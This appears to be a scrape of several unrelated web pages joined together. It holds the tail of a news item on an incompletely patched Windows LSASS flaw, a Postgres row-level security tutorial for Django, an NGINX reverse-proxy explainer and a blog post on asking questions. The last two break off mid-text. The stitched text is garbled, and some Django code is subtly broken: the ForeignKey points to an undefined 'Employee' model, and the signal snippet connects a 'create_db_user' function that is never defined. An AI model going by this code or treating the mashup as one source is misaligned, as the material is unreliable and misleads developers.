mitigation.</p><p>However, Forshaw disagrees. In a tweet, Forshaw said that the patch issued by Microsoft for CVE-2020-1509 is incomplete and Windows 8.1/10/Server run systems are vulnerable to the LSASS flaw.</p><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Seems that it was incorrectly fixed (guess it's one of those days). As I pointed out in the original report the parsing of the SPN was wildly incorrect, as it hasn't been fixed as long as the system has a proxy configured you can bypass the fix. <a href="https://t.co/IytJ8YKDKi">https://t.co/IytJ8YKDKi</a> <a href="https://t.co/mXlriMS29R">https://t.co/mXlriMS29R</a></p><p>— James Forshaw (@tiraniddo) <a href="https://twitter.com/tiraniddo/status/1293327807439831040?ref_src=twsrc%5Etfw">August 11, 2020</a></p></blockquote><p>Forshaw says that the Windows operating system run PC/laptops/servers are still vulnerable as long as a configured proxy is present on the system.</p><p>Forshaws says that the <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2039#c4">Proof-of-Concept exploit</a> build by him in May can still be used. Only, potential hackers could have to manually add a proxy server in the settings and the code can be executed with specific arguments.&nbsp;“The issue is the DsCrackSpn2 call which was highlighted as incorrect has not been fixed. This allows you to specify an SPN which will both satisfy the proxy check and SPN check-in CIFS etc. This isn’t as general as the original bug as the system needs to have a configured proxy, however in enterprise environments that’s likely a given and where this issue is the most serious.” Forshaw says.</p></div></div></div></article></div>]]>

Postgres introduced <a href="https://www.postgresql.org/docs/9.5/ddl-rowsecurity.html">row-level security</a> in 2016 to give database administrators a way to limit the rows a user can access, adding an extra layer of data protection. What's nice about RLS is that if a user tries to select or alter a row they don't have access to, their query will return 0 rows, rather than throwing a permissions error. This way, a user can use <code>select * from table_name</code>, and they will only receive the rows they have access to with no knowledge of rows they don't.</p>
<p>Most examples of RLS limit row access by database user. This can be a powerful feature. In this article, we will have a look at how you can make this happen for your Django app. The problem most people run into when trying to implement row level security is that most web applications, including Django applications, connect to the database with a single user, which makes it hard to take advantage of row level security. </p>
<p>One way to get around this is to create a database user for each application user. We’ll start with just the database layer. We’ll build out our tables and create a couple of users, then write our first row level security policy to limit which rows those users can access. Once we have an understanding of how RLS works in Postgres, we’ll expand our project out into Django and see how we can handle working with policies and multiple database users in a web application. </p>

<h2 id="how-to-use-rls-at-the-database-level"><a href="#how-to-use-rls-at-the-database-level" aria-label="how to use rls at the database level permalink"></a>How to use RLS at the database level</h2>
<p>Before we get to the Django side of things, let's take a look at how RLS works in Postgres. We'll keep it simple and say we are building an app to help our salespeople keep track of their clients, and we want to make sure no salesperson can access the clients of another salesperson. (These are very competitive, cutthroat salespeople). </p>
<p>First, let's set up our tables and populate them with some data:</p>
<div data-language="sql"><pre><code><span>CREATE</span> <span>TABLE</span> salespeople <span>(</span>id <span>serial</span> <span>primary</span> <span>key</span><span>,</span> name <span>text</span><span>)</span><span>;</span>
<span>CREATE</span> <span>TABLE</span> clients <span>(</span>id <span>serial</span> <span>primary</span> <span>key</span><span>,</span> name <span>text</span><span>,</span> salesperson_id <span>integer</span><span>)</span><span>;</span>

<span>INSERT</span> <span>INTO</span> salespeople <span>(</span>name<span>)</span> <span>values</span> <span>(</span><span>'Picard'</span><span>)</span><span>;</span>
<span>INSERT</span> <span>INTO</span> salespeople <span>(</span>name<span>)</span> <span>values</span> <span>(</span><span>'Crusher'</span><span>)</span><span>;</span>

<span>INSERT</span> <span>INTO</span> clients <span>(</span>name<span>,</span> salesperson_id<span>)</span> <span>values</span> <span>(</span><span>'client1'</span><span>,</span> <span>1</span><span>)</span><span>;</span>
<span>INSERT</span> <span>INTO</span> clients <span>(</span>name<span>,</span> salesperson_id<span>)</span> <span>values</span> <span>(</span><span>'client2'</span><span>,</span> <span>2</span><span>)</span><span>;</span>
<span>INSERT</span> <span>INTO</span> clients <span>(</span>name<span>,</span> salesperson_id<span>)</span> <span>values</span> <span>(</span><span>'client3'</span><span>,</span> <span>2</span><span>)</span><span>;</span></code></pre></div>
<p>Now, we have two salespeople. <code>Picard</code> has one client, and <code>Crusher</code> has two clients.</p>
<p>Next, we are going to need some database users, one for each salesperson. Because two salespeople might share the same name, we are going to use the <code>id</code> to create Postgres users. We are also going to create a role called <code>salespeople</code>. This will be the role we grant permissions on, and all of our salespeople can inherit from it.</p>
<div data-language="sql"><pre><code><span>CREATE</span> ROLE <span>"1"</span><span>;</span>
<span>CREATE</span> ROLE <span>"2"</span><span>;</span>
<span>CREATE</span> ROLE salespeople<span>;</span>

<span>GRANT</span> <span>select</span><span>,</span> <span>insert</span> <span>ON</span> clients <span>TO</span> salespeople<span>;</span>
<span>GRANT</span> salespeople <span>TO</span> <span>"1"</span><span>;</span>
<span>GRANT</span> salespeople <span>TO</span> <span>"2"</span><span>;</span></code></pre></div>
<p>This setup will come in handy in the next section when we have to deal with Django's tables in addition to the ones we create for our models.</p>
<p>Now we are ready to set up RLS on our <code>clients</code> table. Our policy will limit access to the Postgres <code>current_user</code> so that they can only view rows where <code>current_user</code> matches <code>salesperson_id</code>. </p>
<div data-language="sql"><pre><code><span>ALTER</span> <span>TABLE</span> clients <span>ENABLE</span> <span>ROW</span> <span>LEVEL</span> SECURITY<span>;</span>
<span>CREATE</span> POLICY salesperson_clients <span>ON</span> clients <span>USING</span> <span>(</span>salesperson_id::<span>text</span> <span>=</span> <span>current_user</span><span>)</span><span>;</span></code></pre></div>
<p>When we create the policy, we give it a name, <code>salesperson_clients</code>, and enter the table we want to set the policy on, <code>clients</code>. Next, we define the policy. In this case, it is very simple: the <code>salesperson_id</code> on the table must be equal to the value of <code>current_user</code>. We have to convert the <code>salesperson_id</code> from an integer to text because our <code>current_user</code> must be a string (we can't create Postgres users with integers as names).</p>
<p>Right now, we are logged in as the <code>postgres</code> user.</p>
<div data-language="sql"><pre><code><span>SELECT</span> <span>session_user</span><span>,</span> <span>current_user</span><span>;</span></code></pre></div>
<div data-language="text"><pre><code> session_user  | current_user  
---------------+---------------
 postgres      | postgres
(1 row)</code></pre></div>
<p>If we query our <code>clients</code> table, we will be able to see all the rows because <strong>RLS policies do not apply to superusers.</strong></p>

<div data-language="text"><pre><code> id |  name   | salesperson_id 
----+---------+----------------
  1 | client1 |              1
  2 | client2 |              2
  3 | client3 |              2
(3 rows)</code></pre></div>
<p>But if we change the current user, we only get the rows that belong to that user. </p>
<div data-language="sql"><pre><code><span>SET</span> ROLE <span>"1"</span><span>;</span>
<span>SELECT</span> <span>session_user</span><span>,</span> <span>current_user</span><span>;</span></code></pre></div>
<div data-language="text"><pre><code> session_user | current_user 
--------------+--------------
 postgres     | 1
(1 row)</code></pre></div>

<div data-language="text"><pre><code> id |  name   | salesperson_id 
----+---------+----------------
  1 | client1 |              1
(1 row)</code></pre></div>

<p>Now, how can we translate this to a Django application?</p>
<p>First, we will need to create a database user for each app user we create. One way to accomplish this would be to override the <code>save</code> method on the Salesperson model, but this is a great opportunity to take advantage of <a href="https://docs.djangoproject.com/en/3.0/ref/signals/">Django signals</a> , so we'll create a signal that creates the database user after a new salesperson is saved.  </p>
<p>Next, we'll have to figure out how to switch to the correct user when a salesperson logs in. For this, we can use a middleware that gets the <code>salesperson_id</code> and sets the role in the database. </p>
<h3 id="models"><a href="#models" aria-label="models permalink"></a>Models</h3>
<p>Our models reflect exactly what we set up in our earlier database example. Here I chose to make Salesperson a proxy of Django's built-in <code>User</code> model, but this is not required.</p>
<div data-language="python"><pre><code><span>from</span> django<span>.</span>db <span>import</span> models
<span>from</span> django<span>.</span>contrib<span>.</span>auth<span>.</span>models <span>import</span> User

<span>class</span> <span>Salesperson</span><span>(</span>User<span>)</span><span>:</span>
    <span>class</span> <span>Meta</span><span>:</span>
        proxy <span>=</span> <span>True</span>
    
<span>class</span> <span>Client</span><span>(</span>models<span>.</span>Model<span>)</span><span>:</span>
    name <span>=</span> models<span>.</span>CharField<span>(</span>max_length<span>=</span><span>50</span><span>)</span>
    Salesperson <span>=</span> models<span>.</span>ForeignKey<span>(</span>Employee<span>,</span> on_delete<span>=</span>models<span>.</span>CASCADE<span>)</span></code></pre></div>
<h3 id="django-signals-creating-our-database-user"><a href="#django-signals-creating-our-database-user" aria-label="django signals creating our database user permalink"></a>Django Signals: Creating Our Database User</h3>
<p>We want to create a new database user every time a new salesperson record is created. We can use Django signals to execute some code after a new record is saved. If you're not familiar with signals, the Django docs on this topic are easy to understand. If this piqued your interest, <a href="https://simpleisbetterthancomplex.com/tutorial/2016/07/28/how-to-create-django-signals.html">this article</a> goes into more detail. </p>
<p>Here is the code for the signal itself, but you'll have to reference the above article to get it registered in your app: </p>
<div data-language="python"><pre><code><span>from</span> <span>.</span>models <span>import</span> Salesperson

post_save<span>.</span>connect<span>(</span>create_db_user<span>,</span> sender<span>=</span>Salesperson<span>)</span> </code></pre></div>
<p>The <code>post_save</code> signal can take a named argument <code>created</code>, which is a boolean. This avoids running the code every time we update the record and ensures it will only run when we create a new salesperson. From there, we can get the user id from the instance and use <code>django.db.connection</code> to run our SQL to create the role and grant permissions. </p>
<p>It's very important to note that if you want to use Django's built-in <code>User</code> model and the authentication that comes with it, you'll need to grant <code>salesperson</code> permissions on the <code>django_admin_log</code> and <code>auth_user</code> tables. That's why it's so helpful to have this parent role that all individual users inherit from.</p>
<h3 id="django-middleware-setting-current-user"><a href="#django-middleware-setting-current-user" aria-label="django middleware setting current user permalink"></a>Django Middleware: Setting Current User</h3>
<p>Now, we can write a <a href="https://docs.djangoproject.com/en/3.0/topics/http/middleware/">middleware</a> to switch the database user to the current application user making the request.</p>
<div data-language="python"><pre><code><span>from</span> django<span>.</span>db <span>import</span> connection

<span>class</span> <span>RlsMiddleware</span><span>(</span><span>object</span><span>)</span><span>:</span>
    <span>def</span> <span>__init__</span> <span>(</span>self<span>,</span> get_response<span>)</span><span>:</span>
        self<span>.</span>get_response <span>=</span> get_response
        
    <span>def</span> <span>__call__</span> <span>(</span>self<span>,</span> request<span>)</span><span>:</span>
        user_id <span>=</span> request<span>.</span>user<span>.</span><span>id</span>
        <span>with</span> connection<span>.</span>cursor<span>(</span><span>)</span> <span>as</span> cursor<span>:</span>
            cursor<span>.</span>execute<span>(</span><span><span>f'SET ROLE "</span><span><span>{</span>user_id<span>}</span></span><span>" '</span></span><span>)</span>

        response <span>=</span> self<span>.</span>get_response<span>(</span>request<span>)</span>
        <span>return</span> response</code></pre></div>
<p>We get the user id from the request object. After that, the code looks pretty similar to our signal. We use the Django <code>db</code> connection again to set the role to the corresponding database user, which should match the application user's id. Don't forget to <a href="https://docs.djangoproject.com/en/3.0/topics/http/middleware/#activating-middleware">register your middleware</a> in <code>settings.py</code>.</p>
<p>Now we can use all of Django's built-in query methods while maintaining row-level security in Postgres. What is particularly cool is that, with the role set, all we need to do to get all of a salesperson's clients is call <code>Client.objects.all()</code>, and we can be sure that only the clients related to the salesperson will be returned. If a salesperson tries to query for a client that doesn't belong to them, they'll get zero results.</p>
<h2 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h2>
<p>In this article we were able to create a simple but powerful row level security policy and, with the help of Django middleware and Django signals, implement the policy at the application level. We saw how to create database users each time we created a new application user, and looked at setting the database role to the correct user after log in, ensuring each application user only had access to the rows that belonged to them. </p>
<p>There are a few caveats here. For one, using the ids <code>1, 2, 3</code> is probably not a good idea in production. You'd want to set up some kind of UUID or some other identifier. Also, creating a new database user for every application user becomes hard to scale at a certain point. Row level security can be a useful tool for limiting access at the database level, and we just scratched the surface of what's possible.</p>
<p>Still, you should be sure RLS is the right solution for your application before trying to implement it. In particular, the performance implications of row-level security, and how the Postgres planner treats it for query plans should not be overlooked. This has been <a href="https://medium.com/@cazzer/designing-the-most-performant-row-level-security-strategy-in-postgres-a06084f31945">significantly improved in Postgres 10</a>, but its still essential to <a href="https://pganalyze.com/postgres-explain">monitor your Postgres query plans</a> when using RLS.</p>
<p>In many cases, RLS is not needed, and you’ll be able to secure your data using the <a href="https://coderbook.com/@marcus/how-to-restrict-access-with-django-permissions/">security measures</a> already built into Django.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>You are trying to deploy your Django web app to the internet.
You have never done this before, so you follow a guide like <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-django-with-postgres-nginx-and-gunicorn-on-ubuntu-16-04">this one</a>.
The guide gives you many instructions, which includes installing and configuring an "NGINX reverse proxy".
At some point you mutter to yourself:</p>
<blockquote>
<p>What-the-hell is an NGINX? Eh, whatever, let's keep reading.</p>
</blockquote>
<p>You will have to copy-paste some weird gobbledygook into a file, which looks like this:</p>
<div><pre><span></span><code><span># NGINX site config file at /etc/nginx/sites-available/myproject</span>
<span>server</span> <span>{</span>
    <span>listen</span> <span>80</span><span>;</span>
    <span>server_name</span> <span>foo.com</span><span>;</span>
    <span>location</span> <span>/</span> <span>{</span>
        <span>proxy_pass</span> <span>http://127.0.0.1:8000</span><span>;</span>
        <span>proxy_set_header</span> <span>Host</span> <span>$host</span><span>;</span>
        <span>proxy_set_header</span> <span>X-Forwarded-For</span> <span>$proxy_add_x_forwarded_for</span><span>;</span>
        <span>proxy_set_header</span> <span>X-Forwarded-Proto</span> <span>$scheme</span><span>;</span>
        <span>proxy_redirect</span> <span>http://127.0.0.1:8000</span> <span>http://foo.com</span><span>;</span>
    <span>}</span>
    <span>location</span> <span>/static/</span> <span>{</span>
        <span>root</span> <span>/home/myuser/myproject</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<p>What is all this stuff? What is it supposed to do?</p>
<p>Most people do their first Django deployment as a learning exercise.
You want to understand what you are doing, so that you can fix problems if you get stuck
and so you don't need to rely on guides in the future.
In this post I'll break down the elements of this NGINX config and how it ties in with Django,
so that you can confidently debug, update and extend it in the future.</p>
<h2>What is this file supposed to achieve?</h2>
<p>This scary-looking config file sets up NGINX so that it acts as the entrypoint to your Django application.
Explaining <em>why</em> you might choose to use NGINX is a topic too expansive for this post, so I'm just going to stick to explaining
how it works.</p>
<p>NGINX is completely separate program to your Django app.
It is running inside its own process, while Django is running inside a <a href="https://mattsegal.dev/simple-django-deployment-2.html#wsgi">WSGI server</a> process, such as Gunicorn.
In this post I will sometimes refer to Gunicorn and Django interchangeably.</p>
<p><img alt="nginx as a separate process" src="https://mattsegal.dev/nginx-separate-process.png"></p>
<p>All HTTP requests that hit your Django app have to go through NGINX first.</p>
<p><img alt="nginx proxy" src="https://mattsegal.dev/nginx-proxy.png"></p>
<p>NGINX listens for incoming HTTP requests on port 80 and HTTPS requests on port 443.
When a new request comes in:</p>
<ul>
<li>NGINX looks at the request, checks some rules, and sends it on to your WSGI server, which is usually listening on localhost, port 8000</li>
<li>Your Django app will process the request and eventually produce a response</li>
<li>Your WSGI server will send the response back to NGINX; and then</li>
<li>NGINX will send the response back out to the original requesting client</li>
</ul>
<p>You can also configure NGINX to serve static files, like images, directly from the filesystem, so that requests for these assets don't need to go through Django</p>
<p><img alt="nginx proxy with static files" src="https://mattsegal.dev/nginx-static-proxy.png"></p>
<p>You can adjust the rules in NGINX so that it selectively routes requests to multiple app servers. You could, for example, run a Wordpress site and a Django app from the same server:</p>
<p><img alt="nginx multi proxy" src="https://mattsegal.dev/nginx-multi-proxy.png"></p>
<p>Now that you have a general idea of what NGINX is supposed to do, let's go over the config file that makes this happen.</p>
<h2>Server block</h2>
<p>The top level block in the NGINX config file is the <a href="https://docs.nginx.com/nginx/admin-guide/web-server/web-server/#setting-up-virtual-servers">virtual server</a>.
The main utility of virtual servers is that they allow you to sort incoming requests based on the port and hostname.
Let's start by looking at a basic server block:</p>
<div><pre><span></span><code><span>server</span> <span>{</span>
    <span># Listen on port 80 for incoming requests.</span>
    <span>listen</span> <span>80</span><span>;</span>
    <span># Return status code 200 with text "Hello World".</span>
    <span>return</span> <span>200</span> <span>'Hello</span> <span>World'</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>Let me show you some example requests. Say we're on the same server as NGINX and we send a GET request using the command line tool <code>curl</code>.</p>
<div><pre><span></span><code>curl localhost
<span># Hello World</span>
</code></pre></div>
<p>This <code>curl</code> command sends the following <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages">HTTP request</a> to localhost, port 80:</p>
<div><pre><span></span><code><span>GET</span> <span>/</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>localhost</span>
<span>User-Agent</span><span>:</span> <span>curl/7.58.0</span>
</code></pre></div>
<p>We will get the following HTTP response back from NGINX, with a 200 OK status code and "Hello World" in the body:</p>
<div><pre><span></span><code><span>HTTP</span><span>/</span><span>1.1</span> <span>200</span> <span>OK</span>
<span>Content-Type</span><span>:</span> <span>application/octet-stream</span>
<span>Content-Length</span><span>:</span> <span>11</span>

Hello World
</code></pre></div>
<p>We can also request some random path and we get the same result:</p>
<div><pre><span></span><code>curl localhost/some/path/on/website
<span># Hello World</span>
</code></pre></div>
<p>With <code>curl</code> sending this HTTP request: </p>
<div><pre><span></span><code><span>GET</span> <span>/some/path/on/website</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>localhost</span>
<span>User-Agent</span><span>:</span> <span>curl/7.58.0</span>
</code></pre></div>
<p>and we get back the same response as before:</p>
<div><pre><span></span><code><span>HTTP</span><span>/</span><span>1.1</span> <span>200</span> <span>OK</span>
<span>Content-Type</span><span>:</span> <span>application/octet-stream</span>
<span>Content-Length</span><span>:</span> <span>11</span>

Hello World
</code></pre></div>
<p>Simple so far, but not very interesting, let's start to mix it up with multiple server blocks.</p>
<h2>Multiple virtual servers</h2>
<p>You can add more than one virtual server in NGINX:</p>
<div><pre><span></span><code><span># All requests to foo.com return a 200 OK status code</span>
<span>server</span> <span>{</span>
    <span>listen</span> <span>80</span><span>;</span>
    <span>server_name</span> <span>foo.com</span><span>;</span>
    <span>return</span> <span>200</span> <span>'Welcome</span> <span>to</span> <span>foo.com!'</span><span>;</span>
<span>}</span>

<span># Any other requests get a 404 Not Found page</span>
<span>server</span> <span>{</span>
    <span>listen</span> <span>80</span> <span>default_server</span><span>;</span>
    <span>return</span> <span>404</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>NGINX uses the <code>server_name</code> directive to check the <code>Host</code> header of incoming requests and match the request to a virtual server. Your web browser will usually set this header automatically for you.
You can set up a particular virtual server to be the default choice (<code>default_server</code>) if no other ones match the incoming request. You can use this feature to host multiple
Django apps on a single server. All you need to do is <a href="https://mattsegal.dev/dns-for-noobs.html">set up your DNS</a> to get multiple domain names to point to a single server, and then add a virtual server for each Django app.</p>
<p>Let's test out the config above. If send a request to <code>localhost</code>, we'll get a 404 status code from the default server:</p>
<div><pre><span></span><code>curl localhost
<span># &lt;html&gt;</span>
<span>#   &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span>
<span>#   ...</span>
<span># &lt;/html&gt;</span>
</code></pre></div>
<p>This is the request that gets sent:</p>
<div><pre><span></span><code><span>GET</span> <span>/</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>localhost</span>
<span>User-Agent</span><span>:</span> <span>curl/7.58.0</span>
</code></pre></div>
<p>Our request was matched to the default server because the <code>Host</code> header we sent didn't match <code>foo.com</code>. Let's try setting the <code>Host</code> header to <code>foo.com</code>:</p>
<div><pre><span></span><code>curl localhost --header <span>"Host: foo.com"</span>
<span># Welcome to foo.com!</span>
</code></pre></div>
<p>This is the request that gets sent:</p>
<div><pre><span></span><code><span>GET</span> <span>/</span> <span>HTTP</span><span>/</span><span>1.1</span>
<span>Host</span><span>:</span> <span>foo.com</span>
<span>User-Agent</span><span>:</span> <span>curl/7.58.0</span>
</code></pre></div>
<p>Now are directed to the <code>foo.com</code> virtual server because we sent the correct <code>Host</code> header in our request.
Finally, we can see that setting a random <code>Host</code> header sends us to the default server:</p>
<div><pre><span></span><code>curl localhost --header <span>"Host: fasfsadfs.com"</span>
<span># &lt;html&gt;</span>
<span>#   &lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span>
<span>#   ...</span>
<span># &lt;/html&gt;</span>
</code></pre></div>
<p>There's <a href="https://docs.nginx.com/nginx/admin-guide/web-server/web-server/#setting-up-virtual-servers">more</a> that you can do with virtual servers in NGINX,
but what we've covered so far should be enough for you to understand their typical usage with Django. </p>
<h2>Location blocks</h2>
<p>Within a virtual server you can route the request based on the path.</p>
<div><pre><span></span><code><span>server</span> <span>{</span>
    <span>listen</span> <span>80</span><span>;</span>
    <span># Requests to the root path get a 200 OK response</span>
    <span>location</span> <span>/</span> <span>{</span>
        <span>return</span> <span>200</span> <span>'Cool!'</span><span>;</span>
    <span>}</span>
    <span># Requests to /forbidden get 403 Forbidden response</span>
    <span>location</span> <span>/forbidden</span> <span>{</span>
        <span>return</span> <span>403</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<p>Under this configuration, any requested path that matches <code>/forbidden</code> will return a 403 Forbidden status code, and everything else will return <em>Cool!</em> Let's try it out:</p>
<div><pre><span></span><code>curl localhost
<span># Cool!</span>
curl localhost/blah/blah/blah
<span># Cool!</span>
curl localhost/forbidden
<span># &lt;html&gt;</span>
<span># &lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span>
<span># ...</span>
<span># &lt;/html&gt;</span>

curl localhost/forbidden/blah/blah/blah
<span># &lt;html&gt;</span>
<span># &lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;</span>
<span># ...</span>
<span># &lt;/html&gt;</span>
</code></pre></div>
<p>Now that we've covered <code>server</code> and <code>location</code> blocks it should be easier to make sense of some of the config that I showed you at the start of this post:</p>
<div><pre><span></span><code><span>server</span> <span>{</span>
    <span>listen</span> <span>80</span><span>;</span>
    <span>server_name</span> <span>foo.com</span><span>;</span>
    <span>location</span> <span>/</span> <span>{</span>
        <span># Do something...</span>
    <span>}</span>
    <span>location</span> <span>/static/</span> <span>{</span>
        <span># Do something...</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<p>Next we'll dig into the connection between NGINX and our WSGI server.</p>
<h2>Reverse proxy location</h2>
<p>As mentioned earlier, NGINX acts as a <a href="https://en.wikipedia.org/wiki/Reverse_proxy#:~:text=In%20computer%20networks%2C%20a%20reverse,from%20the%20proxy%20server%20itself.">reverse proxy</a> for Django:</p>
<p><img alt="nginx proxy" src="https://mattsegal.dev/nginx-proxy.png"></p>
<p>This reverse proxy setup is configured within this location block:</p>
<div><pre><span></span><code><span>location</span> <span>/</span> <span>{</span>
    <span>proxy_pass</span> <span>http://127.0.0.1:8000</span><span>;</span>
    <span>proxy_set_header</span> <span>Host</span> <span>$host</span><span>;</span>
    <span>proxy_set_header</span> <span>X-Forwarded-For</span> <span>$proxy_add_x_forwarded_for</span><span>;</span>
    <span>proxy_set_header</span> <span>X-Forwarded-Proto</span> <span>$scheme</span><span>;</span>
    <span>proxy_redirect</span> <span>http://127.0.0.1:8000</span> <span>http://foo.com</span><span>;</span>
<span>}</span>
</code></pre></div>
<p>In the next few sections I will break down the directives in this block so that you understand what is going on.
You might also find the NGINX documentation on <a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">reverse proxies</a> helpful for understanding this config.</p>
<h2>Proxy pass</h2>
<p>The <code>proxy_pass</code> directive tells NGINX to send all requests for that location to the specified address.
For example, if your WSGI server was running on localhost (which has IP 127.0.0.1), port 8000, then you would use this config:</p>
<div><pre><span></span><code><span>server</span> <span>{</span>
    <span>listen</span> <span>80</span><span>;</span>
    <span>location</span> <span>/</span> <span>{</span>
        <span>proxy_pass</span> <span>http://127.0.0.1:8000</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<p>You can also point <code>proxy_pass</code> at a <a href="https://en.wikipedia.org/wiki/Unix_domain_socket#:~:text=A%20Unix%20domain%20socket%20or,the%20same%20host%20operating%20system.">Unix domain socket</a>, with Gunicorn listening on that socket, which is very similar to using localhost except it doesn't use up a port number and it's a bit faster:</p>
<div><pre><span></span><code><span>server</span> <span>{</span>
    <span>listen</span> <span>80</span><span>;</span>
    <span>location</span> <span>/</span> <span>{</span>
        <span>proxy_pass</span> <span>http://unix:/home/user/my-socket-file.sock</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div>
<p>Seems simple enough - you just point NGINX at your WSGI server, so... what was all that other crap? Why do you set <code>proxy_set_header</code> and <code>proxy_redirect</code>? That's what we'll discuss next.</p>
<h2>NGINX is lying to you</h2>
<p>As a reverse proxy, NGINX will receive HTTP requests from clients and then send those requests to our Gunicorn WSGI server.
The problem is that NGINX hides information from our WSGI server. The HTTP request that Gunicorn receives is not the same as the one that NGINX received from the client.</p>
<p><img alt="nginx hiding info" src="https://mattsegal.dev/nginx-hide-info.png"></p>
<p>Let me give you an example, which is illustrated above. You, the client, have an IP of <code>12.34.56.78</code> and you go to <code>https://foo.com</code> in your web browser and try to load the page. The request hits the server on port 443 and is read by NGINX. At this stage, NGINX knows that:</p>
<ul>
<li>the protocol is <a href="https://www.cloudflare.com/learning/ssl/what-is-https/">HTTPS</a></li>
<li>the client has an IP address of <code>12.34.56.78</code></li>
<li>the request is for the host <code>foo.com</code></li>
</ul>
<p>NGINX then sends the request onwards to Gunicorn. When Gunicorn receives this request, it thinks:</p>
<ul>
<li>the protocol is HTTP, not HTTPS, because the connection between NGINX and Gunicorn is not encrypted</li>
<li>the client has the IP address <code>127.0.0.1</code>, because that's the address NGINX is using</li>
<li>the host is <code>127.0.0.1:8000</code> because NGINX said so</li>

  <time datetime="2020-08-13T00:00:00+00:00">13 Aug 2020</time>
  <p>One might think that knowledge work depends on <em>knowing</em> things, but often it’s actually about knowing how to <em>ask the right questions</em>. In many professions this is a core skill you’ll need to learn from the start (eg. journalism, medicine, therapy), but as soon as you move into leadership roles you’ll find that asking questions takes up a lot of your time, no matter which profession you’re in. There are (at least) four hard things about asking questions:</p>

<ol>
  <li>You want to make sure you’re asking the right question.</li>
  <li>You can’t ask the exact question you want answered because you won’t get honest answers or you won’t know whom to ask.</li>
  <li>You often have limited time to ask questions, so you need to be effective.</li>
  <li>Sometimes, the important thing is not <em>what</em> you ask, but <em>how much</em> you ask or <em>when</em>.</li>
</ol>

<p>Let’s see what effective questions might look like in various roles, situations and professions:</p>

<h3 id="as-someone-who-wants-to-start-a-company">As someone who wants to start a company</h3>
<p>Let’s start with a non-profession: A person who wants to start a company but who doesn’t have a business idea yet. I think the most important question to ask yourself is <em>why</em> you want to start a company. You should ask yourself: <em>Do I want to become rich or do I want freedom?</em> If you want to be rich, you’ll need to build something big, which means you’ll probably need external financing of some kind. However, having external investors removes a lot of the freedom. If you want to start a company to be your own boss, this is <em>not</em> the path you should take.</p>

<p>No matter which route you take (big or independent), most successful entrepreneurs I know took a two-step approach:</p>

<ol>
  <li>Try to think like a surfer and ask yourself: <em>Where will the next big wave show up?</em> (where wave = market) Then try to put yourself in a position where you might take advantage of the wave. In my experience most of these waves tend to come from new technology or regulation.</li>
  <li>Try to have open conversations with people in that market and ask them: <em>What things often frustrate you?</em>. Stop once you’ve found five people who have the same problem that they desperately want a solution for. If they’re desperate, they will probably be very helpful when you try to solve the problem for them.</li>
</ol>

<h3 id="as-a-startup-founder">As a startup founder</h3>
<p>Once you’ve started your company, you’ll want to know if you’re going after a real problem, and if so, if what you’re doing is actually solving it. The founders of Superhuman discovered one question that stood out in order to assess this. They would ask their users:</p>

<ul>
  <li><em>How would you feel if you could no longer use the product?</em></li>
</ul>

<p>and measure the percentage of users who would answer “Very disappointed”. This became their “product-market fit score”, where the magic threshold seems to be 40%. (Source: First Round Review)</p>

<p>Another way of assessing your product-market fit might be to calculate a Net Promotor Score. This is done by asking your users:</p>

<ul>
  <li><em>How likely is it that you would recommend our product to a friend or colleague?</em> (Scale 0-10 where 10 is Extremely likely)</li>
</ul>

<p>Research shows that the people answering 9 or 10 are the ones who will actually recommend you product - they are the <em>promotors</em>. The people answering 7 or 8 are <em>passives</em> and 0 to 6 are <em>detractors</em>. Your Net promotor score is calculated as (number of promotors - number of detractors)/(total number of respondents) and can vary between -100 (only detractors) and +100 (only promotors). Generally, an NPS score of more than 50 is considered excellent.</p>

<h3 id="as-a-startup-investor">As a startup investor</h3>
<p>When investing in startups, most investments actually fail. Therefore, the few investments who are successful will need to compensate for the ones who fail, which is why startup investors will want every investment to have a huge potential. There are three main limits to a startup’s potential: The market, the founding team and their execution. Contrary to what many first-time startup founders think, the <em>idea</em> is not that important since that will change over time. To assess the <em>market</em>, you’ll want the answers to the following questions:</p>

<ul>
  <li><em>How big is the current market for what the company is doing right now?</em> If it’s not big enough, could the market be made bigger by segmenting, finding new target groups or selling adjacent products or services?</li>
  <li><em>How fast is the market growing?</em> It’s much easier to find a profitable segment for your company if the market is growing.</li>
</ul>

<p>To assess the <em>team</em>, two questions stand out:</p>

<ul>
  <li><em>Are the team members intelligent?</em> Starting a successful company means solving problems, and for that you need a combination of brain horsepower and street smarts. A certain “clarity of thought” often helps too.</li>
  <li><em>Can they stand the grind?</em> Running a startup is an emotional roller coaster, and not for the faint of heart. You will want to know if the team has the same level of ambition (extremely important) and if they can show examples of how they’ve handled difficult situations.</li>
</ul>

<p>To assess the <em>execution</em>, it’s important to understand that many startups go up against big incumbents that they can never outspend. The only way to win when competing with an incumbent is to be <em>faster</em>. Therefore, you will want a clear Yes! to the following question:</p>

<ul>
  <li><em>Am I impressed by what this small team has accomplished with their limited resources?</em></li>
</ul>

<h3 id="as-a-salesperson">As a salesperson</h3>
